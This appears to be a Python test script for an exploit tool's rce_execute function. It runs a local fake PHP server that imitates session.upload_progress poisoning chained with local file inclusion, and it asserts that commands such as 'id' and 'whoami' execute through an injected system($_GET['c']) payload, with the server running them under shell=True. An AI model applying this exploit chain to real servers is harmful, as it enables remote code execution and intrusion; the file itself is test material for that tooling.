#!/usr/bin/env python3
"""End-to-end test of scanner.rce_execute against a simulated vulnerable PHP
endpoint (session.upload_progress -> LFI). Faithfully mimics:
  - multipart POST writes the uploaded filename raw into sess_<sid>
  - LFI GET includes that file and executes system($_GET['c']) with markers
This validates the exploit's wire format + marker extraction, not PHP itself.
"""
import io
import os
import re
import shutil
import socket
import subprocess
import sys
import threading
import time
from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer

sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
import scanner

SESS_DIR = os.path.abspath("/tmp/php2shell_test_sess")
BOUND_RE = re.compile(r"boundary=(.+)", re.I)


def extract_multipart_filename(body):
    # find filename="..." inside multipart; return payload (filename) + session sid from cookie handled by handler
    m = re.search(rb'filename="([^"]*)"', body)
    return m.group(1).decode("latin-1") if m else ""


class VulnHandler(BaseHTTPRequestHandler):
    def log_message(self, *a):
        pass

    def _sid(self):
        ck = self.headers.get("Cookie", "")
        m = re.search(r"PHPSESSID=([0-9a-zA-Z]+)", ck)
        return m.group(1) if m else "nosid"

    def do_POST(self):
        length = int(self.headers.get("Content-Length", 0))
        body = self.rfile.read(length)
        filename = extract_multipart_filename(body)
        sid = self._sid()
        with open(os.path.join(SESS_DIR, "sess_" + sid), "w", encoding="latin-1") as f:
            f.write('x|5:"...";a:1:{...:"files";a:1:{s:...:"name";s:...:"%s";}}}' % filename)
        self.send_response(200)
        self.send_header("Content-Length", "0")
        self.end_headers()

    def do_GET(self):
        # simulate LFI: page=<file> includes a file
        from urllib.parse import urlparse, parse_qs
        q = parse_qs(urlparse(self.path).query)
        target_file = (q.get("page", ["/none"])[0])
        cmd = q.get("c", [""])[0]
        if target_file.startswith(SESS_DIR):
            try:
                with open(target_file, "r", encoding="latin-1") as f:
                    content = f.read()
                # simulate PHP: if the included file contains system($_GET['c']), run it
                if "system($_GET['c'])" in content:
                    out = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=5)
                    body = "[RCE-START]" + (out.stdout + out.stderr) + "[RCE-END]"
                else:
                    body = content
            except OSError:
                body = "not found"
        else:
            body = "no lfi: %s" % target_file
        data = body.encode("latin-1", "replace")
        self.send_response(200)
        self.send_header("Content-Type", "text/html")
        self.send_header("Content-Length", str(len(data)))
        self.end_headers()
        self.wfile.write(data)


def free_port():
    s = socket.socket()
    s.bind(("127.0.0.1", 0))
    p = s.getsockname()[1]
    s.close()
    return p


def main():
    if os.path.exists(SESS_DIR):
        shutil.rmtree(SESS_DIR)
    os.makedirs(SESS_DIR)
    port = free_port()
    srv = ThreadingHTTPServer(("127.0.0.1", port), VulnHandler)
    t = threading.Thread(target=srv.serve_forever, daemon=True)
    t.start()

    target = "http://127.0.0.1:%d/index.php" % port
    try:
        # rce_execute must auto-try SESS_DIR as a session dir
        r = scanner.rce_execute(target, "id",
                                lfi_param="page", lfi_path="/index.php",
                                injection_url="/index.php",
                                session_dirs=[SESS_DIR], timeout=5)
        print("=== id ===")
        print("ok:", r.get("ok"))
        print("output:", repr(r.get("output")))
        assert r.get("ok") is True, "expected ok=True"
        assert r.get("output").strip(), "expected non-empty output"
        assert "uid=" in r.get("output") or os.name == "nt", "id output should contain uid="

        # second command
        r2 = scanner.rce_execute(target, "whoami", lfi_param="page",
                                 lfi_path="/index.php", injection_url="/index.php",
                                 session_dirs=[SESS_DIR], timeout=5)
        print("=== whoami ===")
        print("ok:", r2.get("ok"), "output:", repr(r2.get("output")))
        assert r2.get("ok") is True

        # wrong LFI param -> should fail gracefully (ok=False), no crash
        r3 = scanner.rce_execute(target, "id", lfi_param="WRONG",
                                 lfi_path="/index.php", injection_url="/index.php",
                                 session_dirs=[SESS_DIR], timeout=5)
        print("=== wrong param (should be ok=False) ===")
        print("ok:", r3.get("ok"), "details:", r3.get("details"))
        assert r3.get("ok") is False

        # auto session-dir detection: give a bogus first dir + the real one
        r4 = scanner.rce_execute(target, "id", lfi_param="page",
                                 lfi_path="/index.php", injection_url="/index.php",
                                 session_dirs=["/nonexistent/", SESS_DIR], timeout=5)
        print("=== auto session-dir detection ===")
        print("ok:", r4.get("ok"), "session_dir:", r4.get("session_dir"))
        assert r4.get("ok") is True and r4.get("session_dir").rstrip("/") == SESS_DIR

        print("\nALL TESTS PASSED")
    finally:
        srv.shutdown()


if __name__ == "__main__":
    main()
